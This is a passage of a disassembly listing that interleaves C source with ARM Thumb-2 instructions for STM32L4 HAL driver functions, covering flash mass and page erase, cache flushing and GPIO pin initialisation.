 8001852:	46bd      	mov	sp, r7
 8001854:	bd80      	pop	{r7, pc}
 8001856:	bf00      	nop
 8001858:	2000000c 	.word	0x2000000c
 800185c:	40022000 	.word	0x40022000

08001860 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001860:	b480      	push	{r7}
 8001862:	b083      	sub	sp, #12
 8001864:	af00      	add	r7, sp, #0
 8001866:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 8001868:	687b      	ldr	r3, [r7, #4]
 800186a:	f003 0301 	and.w	r3, r3, #1
 800186e:	2b00      	cmp	r3, #0
 8001870:	d005      	beq.n	800187e <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001872:	4b09      	ldr	r3, [pc, #36]	; (8001898 <FLASH_MassErase+0x38>)
 8001874:	695b      	ldr	r3, [r3, #20]
 8001876:	4a08      	ldr	r2, [pc, #32]	; (8001898 <FLASH_MassErase+0x38>)
 8001878:	f043 0304 	orr.w	r3, r3, #4
 800187c:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 800187e:	4b06      	ldr	r3, [pc, #24]	; (8001898 <FLASH_MassErase+0x38>)
 8001880:	695b      	ldr	r3, [r3, #20]
 8001882:	4a05      	ldr	r2, [pc, #20]	; (8001898 <FLASH_MassErase+0x38>)
 8001884:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001888:	6153      	str	r3, [r2, #20]
}
 800188a:	bf00      	nop
 800188c:	370c      	adds	r7, #12
 800188e:	46bd      	mov	sp, r7
 8001890:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001894:	4770      	bx	lr
 8001896:	bf00      	nop
 8001898:	40022000 	.word	0x40022000

0800189c <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 800189c:	b480      	push	{r7}
 800189e:	b083      	sub	sp, #12
 80018a0:	af00      	add	r7, sp, #0
 80018a2:	6078      	str	r0, [r7, #4]
 80018a4:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 80018a6:	4b0e      	ldr	r3, [pc, #56]	; (80018e0 <FLASH_PageErase+0x44>)
 80018a8:	695b      	ldr	r3, [r3, #20]
 80018aa:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 80018ae:	687b      	ldr	r3, [r7, #4]
 80018b0:	00db      	lsls	r3, r3, #3
 80018b2:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 80018b6:	490a      	ldr	r1, [pc, #40]	; (80018e0 <FLASH_PageErase+0x44>)
 80018b8:	4313      	orrs	r3, r2
 80018ba:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 80018bc:	4b08      	ldr	r3, [pc, #32]	; (80018e0 <FLASH_PageErase+0x44>)
 80018be:	695b      	ldr	r3, [r3, #20]
 80018c0:	4a07      	ldr	r2, [pc, #28]	; (80018e0 <FLASH_PageErase+0x44>)
 80018c2:	f043 0302 	orr.w	r3, r3, #2
 80018c6:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80018c8:	4b05      	ldr	r3, [pc, #20]	; (80018e0 <FLASH_PageErase+0x44>)
 80018ca:	695b      	ldr	r3, [r3, #20]
 80018cc:	4a04      	ldr	r2, [pc, #16]	; (80018e0 <FLASH_PageErase+0x44>)
 80018ce:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80018d2:	6153      	str	r3, [r2, #20]
}
 80018d4:	bf00      	nop
 80018d6:	370c      	adds	r7, #12
 80018d8:	46bd      	mov	sp, r7
 80018da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018de:	4770      	bx	lr
 80018e0:	40022000 	.word	0x40022000

080018e4 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 80018e4:	b480      	push	{r7}
 80018e6:	b083      	sub	sp, #12
 80018e8:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 80018ea:	4b21      	ldr	r3, [pc, #132]	; (8001970 <FLASH_FlushCaches+0x8c>)
 80018ec:	7f1b      	ldrb	r3, [r3, #28]
 80018ee:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 80018f0:	79fb      	ldrb	r3, [r7, #7]
 80018f2:	2b01      	cmp	r3, #1
 80018f4:	d002      	beq.n	80018fc <FLASH_FlushCaches+0x18>
 80018f6:	79fb      	ldrb	r3, [r7, #7]
 80018f8:	2b03      	cmp	r3, #3
 80018fa:	d117      	bne.n	800192c <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 80018fc:	4b1d      	ldr	r3, [pc, #116]	; (8001974 <FLASH_FlushCaches+0x90>)
 80018fe:	681b      	ldr	r3, [r3, #0]
 8001900:	4a1c      	ldr	r2, [pc, #112]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001902:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 8001906:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001908:	4b1a      	ldr	r3, [pc, #104]	; (8001974 <FLASH_FlushCaches+0x90>)
 800190a:	681b      	ldr	r3, [r3, #0]
 800190c:	4a19      	ldr	r2, [pc, #100]	; (8001974 <FLASH_FlushCaches+0x90>)
 800190e:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001912:	6013      	str	r3, [r2, #0]
 8001914:	4b17      	ldr	r3, [pc, #92]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001916:	681b      	ldr	r3, [r3, #0]
 8001918:	4a16      	ldr	r2, [pc, #88]	; (8001974 <FLASH_FlushCaches+0x90>)
 800191a:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 800191e:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001920:	4b14      	ldr	r3, [pc, #80]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001922:	681b      	ldr	r3, [r3, #0]
 8001924:	4a13      	ldr	r2, [pc, #76]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001926:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800192a:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 800192c:	79fb      	ldrb	r3, [r7, #7]
 800192e:	2b02      	cmp	r3, #2
 8001930:	d002      	beq.n	8001938 <FLASH_FlushCaches+0x54>
 8001932:	79fb      	ldrb	r3, [r7, #7]
 8001934:	2b03      	cmp	r3, #3
 8001936:	d111      	bne.n	800195c <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 8001938:	4b0e      	ldr	r3, [pc, #56]	; (8001974 <FLASH_FlushCaches+0x90>)
 800193a:	681b      	ldr	r3, [r3, #0]
 800193c:	4a0d      	ldr	r2, [pc, #52]	; (8001974 <FLASH_FlushCaches+0x90>)
 800193e:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001942:	6013      	str	r3, [r2, #0]
 8001944:	4b0b      	ldr	r3, [pc, #44]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001946:	681b      	ldr	r3, [r3, #0]
 8001948:	4a0a      	ldr	r2, [pc, #40]	; (8001974 <FLASH_FlushCaches+0x90>)
 800194a:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 800194e:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001950:	4b08      	ldr	r3, [pc, #32]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001952:	681b      	ldr	r3, [r3, #0]
 8001954:	4a07      	ldr	r2, [pc, #28]	; (8001974 <FLASH_FlushCaches+0x90>)
 8001956:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800195a:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 800195c:	4b04      	ldr	r3, [pc, #16]	; (8001970 <FLASH_FlushCaches+0x8c>)
 800195e:	2200      	movs	r2, #0
 8001960:	771a      	strb	r2, [r3, #28]
}
 8001962:	bf00      	nop
 8001964:	370c      	adds	r7, #12
 8001966:	46bd      	mov	sp, r7
 8001968:	f85d 7b04 	ldr.w	r7, [sp], #4
 800196c:	4770      	bx	lr
 800196e:	bf00      	nop
 8001970:	2000000c 	.word	0x2000000c
 8001974:	40022000 	.word	0x40022000

08001978 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001978:	b480      	push	{r7}
 800197a:	b087      	sub	sp, #28
 800197c:	af00      	add	r7, sp, #0
 800197e:	6078      	str	r0, [r7, #4]
 8001980:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001982:	2300      	movs	r3, #0
 8001984:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001986:	e148      	b.n	8001c1a <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001988:	683b      	ldr	r3, [r7, #0]
 800198a:	681a      	ldr	r2, [r3, #0]
 800198c:	2101      	movs	r1, #1
 800198e:	697b      	ldr	r3, [r7, #20]
 8001990:	fa01 f303 	lsl.w	r3, r1, r3
 8001994:	4013      	ands	r3, r2
 8001996:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001998:	68fb      	ldr	r3, [r7, #12]
 800199a:	2b00      	cmp	r3, #0
 800199c:	f000 813a 	beq.w	8001c14 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 80019a0:	683b      	ldr	r3, [r7, #0]
 80019a2:	685b      	ldr	r3, [r3, #4]
 80019a4:	f003 0303 	and.w	r3, r3, #3
 80019a8:	2b01      	cmp	r3, #1
 80019aa:	d005      	beq.n	80019b8 <HAL_GPIO_Init+0x40>
 80019ac:	683b      	ldr	r3, [r7, #0]
 80019ae:	685b      	ldr	r3, [r3, #4]
 80019b0:	f003 0303 	and.w	r3, r3, #3
 80019b4:	2b02      	cmp	r3, #2
 80019b6:	d130      	bne.n	8001a1a <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 80019b8:	687b      	ldr	r3, [r7, #4]
 80019ba:	689b      	ldr	r3, [r3, #8]
 80019bc:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 80019be:	697b      	ldr	r3, [r7, #20]
 80019c0:	005b      	lsls	r3, r3, #1
 80019c2:	2203      	movs	r2, #3
 80019c4:	fa02 f303 	lsl.w	r3, r2, r3
 80019c8:	43db      	mvns	r3, r3
 80019ca:	693a      	ldr	r2, [r7, #16]
 80019cc:	4013      	ands	r3, r2
 80019ce:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 80019d0:	683b      	ldr	r3, [r7, #0]
 80019d2:	68da      	ldr	r2, [r3, #12]
 80019d4:	697b      	ldr	r3, [r7, #20]
 80019d6:	005b      	lsls	r3, r3, #1
 80019d8:	fa02 f303 	lsl.w	r3, r2, r3
 80019dc:	693a      	ldr	r2, [r7, #16]
 80019de:	4313      	orrs	r3, r2
 80019e0:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 80019e2:	687b      	ldr	r3, [r7, #4]
 80019e4:	693a      	ldr	r2, [r7, #16]
 80019e6:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 80019e8:	687b      	ldr	r3, [r7, #4]
 80019ea:	685b      	ldr	r3, [r3, #4]
 80019ec:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 80019ee:	2201      	movs	r2, #1
 80019f0:	697b      	ldr	r3, [r7, #20]
 80019f2:	fa02 f303 	lsl.w	r3, r2, r3
 80019f6:	43db      	mvns	r3, r3
 80019f8:	693a      	ldr	r2, [r7, #16]
 80019fa:	4013      	ands	r3, r2
 80019fc:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 80019fe:	683b      	ldr	r3, [r7, #0]
 8001a00:	685b      	ldr	r3, [r3, #4]
 8001a02:	091b      	lsrs	r3, r3, #4
 8001a04:	f003 0201 	and.w	r2, r3, #1
 8001a08:	697b      	ldr	r3, [r7, #20]
 8001a0a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a0e:	693a      	ldr	r2, [r7, #16]
 8001a10:	4313      	orrs	r3, r2
 8001a12:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001a14:	687b      	ldr	r3, [r7, #4]
 8001a16:	693a      	ldr	r2, [r7, #16]
 8001a18:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001a1a:	683b      	ldr	r3, [r7, #0]
 8001a1c:	685b      	ldr	r3, [r3, #4]
 8001a1e:	f003 0303 	and.w	r3, r3, #3
 8001a22:	2b03      	cmp	r3, #3
 8001a24:	d017      	beq.n	8001a56 <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001a26:	687b      	ldr	r3, [r7, #4]
 8001a28:	68db      	ldr	r3, [r3, #12]
 8001a2a:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001a2c:	697b      	ldr	r3, [r7, #20]
 8001a2e:	005b      	lsls	r3, r3, #1
 8001a30:	2203      	movs	r2, #3
 8001a32:	fa02 f303 	lsl.w	r3, r2, r3
 8001a36:	43db      	mvns	r3, r3
 8001a38:	693a      	ldr	r2, [r7, #16]
 8001a3a:	4013      	ands	r3, r2
 8001a3c:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001a3e:	683b      	ldr	r3, [r7, #0]
 8001a40:	689a      	ldr	r2, [r3, #8]
 8001a42:	697b      	ldr	r3, [r7, #20]
 8001a44:	005b      	lsls	r3, r3, #1
 8001a46:	fa02 f303 	lsl.w	r3, r2, r3
 8001a4a:	693a      	ldr	r2, [r7, #16]
 8001a4c:	4313      	orrs	r3, r2
 8001a4e:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001a50:	687b      	ldr	r3, [r7, #4]
 8001a52:	693a      	ldr	r2, [r7, #16]
 8001a54:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001a56:	683b      	ldr	r3, [r7, #0]
 8001a58:	685b      	ldr	r3, [r3, #4]
 8001a5a:	f003 0303 	and.w	r3, r3, #3
 8001a5e:	2b02      	cmp	r3, #2
 8001a60:	d123      	bne.n	8001aaa <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001a62:	697b      	ldr	r3, [r7, #20]
 8001a64:	08da      	lsrs	r2, r3, #3
 8001a66:	687b      	ldr	r3, [r7, #4]
 8001a68:	3208      	adds	r2, #8
 8001a6a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001a6e:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001a70:	697b      	ldr	r3, [r7, #20]
 8001a72:	f003 0307 	and.w	r3, r3, #7
 8001a76:	009b      	lsls	r3, r3, #2
 8001a78:	220f      	movs	r2, #15
 8001a7a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a7e:	43db      	mvns	r3, r3
 8001a80:	693a      	ldr	r2, [r7, #16]
 8001a82:	4013      	ands	r3, r2
 8001a84:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001a86:	683b      	ldr	r3, [r7, #0]
 8001a88:	691a      	ldr	r2, [r3, #16]
 8001a8a:	697b      	ldr	r3, [r7, #20]
 8001a8c:	f003 0307 	and.w	r3, r3, #7
 8001a90:	009b      	lsls	r3, r3, #2
 8001a92:	fa02 f303 	lsl.w	r3, r2, r3
 8001a96:	693a      	ldr	r2, [r7, #16]
 8001a98:	4313      	orrs	r3, r2
 8001a9a:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001a9c:	697b      	ldr	r3, [r7, #20]
 8001a9e:	08da      	lsrs	r2, r3, #3
 8001aa0:	687b      	ldr	r3, [r7, #4]
 8001aa2:	3208      	adds	r2, #8
 8001aa4:	6939      	ldr	r1, [r7, #16]
 8001aa6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001aaa:	687b      	ldr	r3, [r7, #4]
 8001aac:	681b      	ldr	r3, [r3, #0]
 8001aae:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001ab0:	697b      	ldr	r3, [r7, #20]
 8001ab2:	005b      	lsls	r3, r3, #1
 8001ab4:	2203      	movs	r2, #3
 8001ab6:	fa02 f303 	lsl.w	r3, r2, r3
 8001aba:	43db      	mvns	r3, r3
 8001abc:	693a      	ldr	r2, [r7, #16]
 8001abe:	4013      	ands	r3, r2
 8001ac0:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001ac2:	683b      	ldr	r3, [r7, #0]
 8001ac4:	685b      	ldr	r3, [r3, #4]
 8001ac6:	f003 0203 	and.w	r2, r3, #3
 8001aca:	697b      	ldr	r3, [r7, #20]
 8001acc:	005b      	lsls	r3, r3, #1
 8001ace:	fa02 f303 	lsl.w	r3, r2, r3
 8001ad2:	693a      	ldr	r2, [r7, #16]
 8001ad4:	4313      	orrs	r3, r2
 8001ad6:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001ad8:	687b      	ldr	r3, [r7, #4]
 8001ada:	693a      	ldr	r2, [r7, #16]
 8001adc:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001ade:	683b      	ldr	r3, [r7, #0]
 8001ae0:	685b      	ldr	r3, [r3, #4]
 8001ae2:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001ae6:	2b00      	cmp	r3, #0
 8001ae8:	f000 8094 	beq.w	8001c14 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001aec:	4b52      	ldr	r3, [pc, #328]	; (8001c38 <HAL_GPIO_Init+0x2c0>)
 8001aee:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001af0:	4a51      	ldr	r2, [pc, #324]	; (8001c38 <HAL_GPIO_Init+0x2c0>)
 8001af2:	f043 0301 	orr.w	r3, r3, #1
 8001af6:	6613      	str	r3, [r2, #96]	; 0x60
 8001af8:	4b4f      	ldr	r3, [pc, #316]	; (8001c38 <HAL_GPIO_Init+0x2c0>)
 8001afa:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001afc:	f003 0301 	and.w	r3, r3, #1
 8001b00:	60bb      	str	r3, [r7, #8]
 8001b02:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001b04:	4a4d      	ldr	r2, [pc, #308]	; (8001c3c <HAL_GPIO_Init+0x2c4>)
 8001b06:	697b      	ldr	r3, [r7, #20]
 8001b08:	089b      	lsrs	r3, r3, #2
 8001b0a:	3302      	adds	r3, #2
 8001b0c:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001b10:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001b12:	697b      	ldr	r3, [r7, #20]
 8001b14:	f003 0303 	and.w	r3, r3, #3
 8001b18:	009b      	lsls	r3, r3, #2
 8001b1a:	220f      	movs	r2, #15
 8001b1c:	fa02 f303 	lsl.w	r3, r2, r3
 8001b20:	43db      	mvns	r3, r3
 8001b22:	693a      	ldr	r2, [r7, #16]
 8001b24:	4013      	ands	r3, r2
 8001b26:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001b28:	687b      	ldr	r3, [r7, #4]
 8001b2a:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001b2e:	d00d      	beq.n	8001b4c <HAL_GPIO_Init+0x1d4>
 8001b30:	687b      	ldr	r3, [r7, #4]
 8001b32:	4a43      	ldr	r2, [pc, #268]	; (8001c40 <HAL_GPIO_Init+0x2c8>)
 8001b34:	4293      	cmp	r3, r2
 8001b36:	d007      	beq.n	8001b48 <HAL_GPIO_Init+0x1d0>
 8001b38:	687b      	ldr	r3, [r7, #4]
 8001b3a:	4a42      	ldr	r2, [pc, #264]	; (8001c44 <HAL_GPIO_Init+0x2cc>)
 8001b3c:	4293      	cmp	r3, r2
 8001b3e:	d101      	bne.n	8001b44 <HAL_GPIO_Init+0x1cc>
 8001b40:	2302      	movs	r3, #2
 8001b42:	e004      	b.n	8001b4e <HAL_GPIO_Init+0x1d6>
 8001b44:	2307      	movs	r3, #7
 8001b46:	e002      	b.n	8001b4e <HAL_GPIO_Init+0x1d6>
 8001b48:	2301      	movs	r3, #1
 8001b4a:	e000      	b.n	8001b4e <HAL_GPIO_Init+0x1d6>
 8001b4c:	2300      	movs	r3, #0
 8001b4e:	697a      	ldr	r2, [r7, #20]
 8001b50:	f002 0203 	and.w	r2, r2, #3
 8001b54:	0092      	lsls	r2, r2, #2
 8001b56:	4093      	lsls	r3, r2
 8001b58:	693a      	ldr	r2, [r7, #16]
 8001b5a:	4313      	orrs	r3, r2
 8001b5c:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001b5e:	4937      	ldr	r1, [pc, #220]	; (8001c3c <HAL_GPIO_Init+0x2c4>)
 8001b60:	697b      	ldr	r3, [r7, #20]
 8001b62:	089b      	lsrs	r3, r3, #2
 8001b64:	3302      	adds	r3, #2
 8001b66:	693a      	ldr	r2, [r7, #16]
 8001b68:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001b6c:	4b36      	ldr	r3, [pc, #216]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001b6e:	689b      	ldr	r3, [r3, #8]
 8001b70:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b72:	68fb      	ldr	r3, [r7, #12]
 8001b74:	43db      	mvns	r3, r3
 8001b76:	693a      	ldr	r2, [r7, #16]
 8001b78:	4013      	ands	r3, r2
 8001b7a:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001b7c:	683b      	ldr	r3, [r7, #0]
 8001b7e:	685b      	ldr	r3, [r3, #4]
 8001b80:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001b84:	2b00      	cmp	r3, #0
 8001b86:	d003      	beq.n	8001b90 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b88:	693a      	ldr	r2, [r7, #16]
 8001b8a:	68fb      	ldr	r3, [r7, #12]
 8001b8c:	4313      	orrs	r3, r2
 8001b8e:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b90:	4a2d      	ldr	r2, [pc, #180]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001b92:	693b      	ldr	r3, [r7, #16]
 8001b94:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b96:	4b2c      	ldr	r3, [pc, #176]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001b98:	68db      	ldr	r3, [r3, #12]
 8001b9a:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b9c:	68fb      	ldr	r3, [r7, #12]
 8001b9e:	43db      	mvns	r3, r3
 8001ba0:	693a      	ldr	r2, [r7, #16]
 8001ba2:	4013      	ands	r3, r2
 8001ba4:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001ba6:	683b      	ldr	r3, [r7, #0]
 8001ba8:	685b      	ldr	r3, [r3, #4]
 8001baa:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001bae:	2b00      	cmp	r3, #0
 8001bb0:	d003      	beq.n	8001bba <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001bb2:	693a      	ldr	r2, [r7, #16]
 8001bb4:	68fb      	ldr	r3, [r7, #12]
 8001bb6:	4313      	orrs	r3, r2
 8001bb8:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001bba:	4a23      	ldr	r2, [pc, #140]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001bbc:	693b      	ldr	r3, [r7, #16]
 8001bbe:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001bc0:	4b21      	ldr	r3, [pc, #132]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001bc2:	685b      	ldr	r3, [r3, #4]
 8001bc4:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001bc6:	68fb      	ldr	r3, [r7, #12]
 8001bc8:	43db      	mvns	r3, r3
 8001bca:	693a      	ldr	r2, [r7, #16]
 8001bcc:	4013      	ands	r3, r2
 8001bce:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001bd0:	683b      	ldr	r3, [r7, #0]
 8001bd2:	685b      	ldr	r3, [r3, #4]
 8001bd4:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001bd8:	2b00      	cmp	r3, #0
 8001bda:	d003      	beq.n	8001be4 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001bdc:	693a      	ldr	r2, [r7, #16]
 8001bde:	68fb      	ldr	r3, [r7, #12]
 8001be0:	4313      	orrs	r3, r2
 8001be2:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001be4:	4a18      	ldr	r2, [pc, #96]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001be6:	693b      	ldr	r3, [r7, #16]
 8001be8:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001bea:	4b17      	ldr	r3, [pc, #92]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001bec:	681b      	ldr	r3, [r3, #0]
 8001bee:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001bf0:	68fb      	ldr	r3, [r7, #12]
 8001bf2:	43db      	mvns	r3, r3
 8001bf4:	693a      	ldr	r2, [r7, #16]
 8001bf6:	4013      	ands	r3, r2
 8001bf8:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001bfa:	683b      	ldr	r3, [r7, #0]
 8001bfc:	685b      	ldr	r3, [r3, #4]
 8001bfe:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001c02:	2b00      	cmp	r3, #0
 8001c04:	d003      	beq.n	8001c0e <HAL_GPIO_Init+0x296>
        {
